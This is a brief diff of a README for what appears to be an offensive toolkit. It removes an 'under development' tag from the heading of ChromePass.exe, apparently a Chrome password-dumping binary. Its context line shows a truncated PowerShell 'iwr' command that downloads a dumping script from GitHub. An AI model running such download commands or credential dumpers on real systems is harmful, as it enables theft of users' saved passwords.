@@ -42,7 +42,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 <br />
 
 
-## ChromePass.exe - UNDER-DEVELOP (NOT-STABLE)
+## ChromePass.exe
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
